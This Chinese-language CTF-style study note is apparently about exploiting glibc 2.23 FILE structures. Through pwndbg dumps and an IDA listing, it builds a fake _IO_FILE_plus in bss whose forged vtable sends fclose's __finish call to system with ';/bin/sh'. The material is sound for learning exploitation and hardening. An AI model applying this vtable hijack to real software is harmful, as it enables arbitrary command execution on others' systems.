-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>程序运行时的情况</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_file_jumps</span><br><span class="line">$<span class="number">28</span> = (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t *)<span class="number">0xf7fb6ac0</span></span><br><span class="line">$<span class="number">27</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0xf7e6d990</span> &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = <span class="number">0xf7e6e3b0</span> &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = <span class="number">0xf7e6e150</span> &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = <span class="number">0xf7e6f230</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = <span class="number">0xf7e700c0</span> &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = <span class="number">0xf7e6d600</span> &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = <span class="number">0xf7e6d210</span> &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = <span class="number">0xf7e6c4b0</span> &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = <span class="number">0xf7e6f4d0</span> &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = <span class="number">0xf7e6c2f0</span> &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = <span class="number">0xf7e6c1e0</span> &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = <span class="number">0xf7e618d0</span> &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = <span class="number">0xf7e6d5b0</span> &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = <span class="number">0xf7e6d060</span> &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = <span class="number">0xf7e6cda0</span> &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = <span class="number">0xf7e6c2c0</span> &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = <span class="number">0xf7e6d040</span> &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = <span class="number">0xf7e70250</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = <span class="number">0xf7e70260</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>因为当前版本还是2.23，可以直接修改虚表，但是为了方便还是修改修改fd里面的指针，指向一个伪造虚表</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280                 public fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>280 _bss            ends</span><br><span class="line">.bss:<span class="number">0804B</span>280</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; ===========================================================================</span><br><span class="line">.prgend:<span class="number">0804B</span>284</span><br><span class="line">.prgend:<span class="number">0804B</span>284 ; Segment type: Zero-length</span><br><span class="line">.prgend:<span class="number">0804B</span>284 _prgend         segment byte public <span class="string">&#x27;&#x27; use32</span></span><br><span class="line"><span class="string">.prgend:0804B284 _end            label byte</span></span><br><span class="line"><span class="string">.prgend:0804B284 _prgend         ends</span></span><br><span class="line"><span class="string">.prgend:0804B284</span></span><br><span class="line"><span class="string">extern:0804B288 ; ===========================================================================</span></span><br><span class="line"><span class="string">extern:0804B288</span></span><br><span class="line"><span class="string">extern:0804B288 ; Segment type: Externs</span></span><br><span class="line"><span class="string">extern:0804B288 ; extern</span></span><br><span class="line"><span class="string">extern:0804B288 ; char *strstr(const char *haystack, const char *needle)</span></span><br><span class="line"><span class="string">extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j</span></span><br><span class="line"><span class="string">extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o</span></span><br><span class="line"><span class="string">extern:0804B28C ; int printf(const char *format, ...)</span></span><br><span class="line"><span class="string">extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j</span></span><br><span class="line"><span class="string">extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o</span></span><br><span class="line"><span class="string">extern:0804B290 ; int fclose(FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j</span></span><br><span class="line"><span class="string">extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o</span></span><br><span class="line"><span class="string">extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)</span></span><br><span class="line"><span class="string">extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j</span></span><br><span class="line"><span class="string">extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o</span></span><br><span class="line"><span class="string">extern:0804B298 ; unsigned int alarm(unsigned int seconds)</span></span><br><span class="line"><span class="string">extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j</span></span><br><span class="line"><span class="string">extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o</span></span><br><span class="line"><span class="string">extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)</span></span><br><span class="line"><span class="string">extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j</span></span><br><span class="line"><span class="string">extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o</span></span><br><span class="line"><span class="string">extern:0804B2A0 ; int puts(const char *s)</span></span><br><span class="line"><span class="string">extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j</span></span><br><span class="line"><span class="string">extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o</span></span><br><span class="line"><span class="string">extern:0804B2A4 ; void exit(int status)</span></span><br><span class="line"><span class="string">extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j</span></span><br><span class="line"><span class="string">extern:0804B2A4                                         ; DATA XREF: .got.plt:off_804B028↑o</span></span><br><span class="line"><span class="string">extern:0804B2A8 ; char *strchr(const char *s, int c)</span></span><br><span class="line"><span class="string">extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j</span></span><br><span class="line"><span class="string">extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o</span></span><br><span class="line"><span class="string">extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span></span><br><span class="line"><span class="string">extern:0804B2AC                 extrn __libc_start_main:near</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j</span></span><br><span class="line"><span class="string">extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o</span></span><br><span class="line"><span class="string">extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j</span></span><br><span class="line"><span class="string">extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o</span></span><br><span class="line"><span class="string">extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)</span></span><br><span class="line"><span class="string">extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j</span></span><br><span class="line"><span class="string">extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o</span></span><br><span class="line"><span class="string">extern:0804B2B8 ; void *memset(void *s, int c, size_t n)</span></span><br><span class="line"><span class="string">extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j</span></span><br><span class="line"><span class="string">extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o</span></span><br><span class="line"><span class="string">extern:0804B2BC                 extrn __isoc99_scanf:near</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j</span></span><br><span class="line"><span class="string">extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o</span></span><br><span class="line"><span class="string">extern:0804B2C0 ; int atoi(const char *nptr)</span></span><br><span class="line"><span class="string">extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j</span></span><br><span class="line"><span class="string">extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j</span></span><br><span class="line"><span class="string">extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4</span></span><br><span class="line"><span class="string">extern:0804B2C4                 end _start</span></span><br></pre></td></tr></table></figure>
-
-<p>我们产看内存空间发现，在fp后有足够多的空间来放我们的fake_file（虽然filename也很大，但是文件名只可以读取63字节）.所以我们将file放在此处，同时伪造的时候要注意如何跳过fclose的一些检查：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。</span></span><br><span class="line"><span class="comment">//此外还有其他的绕过方法</span></span><br><span class="line"><span class="comment">//这里我并不清楚这些绕过都是什么，待后续学习</span></span><br><span class="line"><span class="number">1.</span>((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line"><span class="comment">//或者是</span></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span> </span><br><span class="line">&amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line">flag&amp;<span class="number">8</span> = <span class="number">0</span> and flag &amp;<span class="number">2</span> =<span class="number">0</span> and flag &amp; <span class="number">0x8000</span> != <span class="number">0</span></span><br><span class="line">所以flag的值可以为<span class="number">0xfbad8000</span> 或者<span class="number">0xfbad8080</span></span><br><span class="line">  <span class="comment">//unlink与io_FILE_plus 联合使用https://www.jianshu.com/p/1e45b785efc1</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>在执行fclose时会执行unlink等一些操作，同时会free我们开启的fp堆块以及储存数据的堆块，如果因为这两个堆块都比较大，检查是否与topchunk相邻，然年进行free,因为储存数据的堆块与topchunk相连，而且其在file堆块前释放，所以两个都会合并到topchunk.fclose会对file_plus的数据进处理</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539124</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">-1</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>继续我们上述的绕过检查，我们修改其的相关参数后释放</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;					<span class="comment">//IO_FILE_plus 堆块</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  bk = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> &#123;</span><br><span class="line">  prev_size = <span class="number">352</span>, </span><br><span class="line">  size = <span class="number">4104</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804d570</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">129681</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-134514768</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0xf7fb77b0</span> &lt;main_arena+<span class="number">48</span>&gt; <span class="string">&quot;p\325\004\b&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以看到，此时只是对file堆块进行了释放，而没有对其数据进行清空，io_read_ptr变为了main_arena,这是因为其加入了unsortedbins,但是这块是或否执行了unlink操作呢?但是我们看到了储存数据的堆块并没有进行free操作。这里这样操作，如果存在UAF是否可以实现泄露数据呢？</p>
-<p>泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开&#x2F;proc&#x2F;self&#x2F;mmap这个虚拟文件来获取当前进程的地址空间情况，</p>
-</li>
-<li><p>整体思路：1.泄露libc地址，获取system函数的真实地址</p>
-<p>​    2.利用fp后面的bss伪造file_plus的结构体（）这部分内存全是空的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">name:<span class="number">0x0</span>,				<span class="comment">//0x20字节</span></span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">fp:fake_file_start </span><br><span class="line"><span class="comment">//下面时伪造的file</span></span><br><span class="line">flags_:<span class="number">0xffffdfff</span>			<span class="comment">//fake_file_start</span></span><br><span class="line">_io_read_ptr:<span class="string">&quot;;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">//下面就可以全是0</span></span><br><span class="line">vtable:fake_file_start+<span class="number">0x94</span>+<span class="number">4</span> </span><br><span class="line"><span class="comment">//fake_vatable   fclose偏移为2</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy)：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2)）：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish)：system_addr</span><br><span class="line"> <span class="comment">//剩下的全写0</span></span><br></pre></td></tr></table></figure>
-
-<p>调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)，此时实际上执行的system(fp);</p>
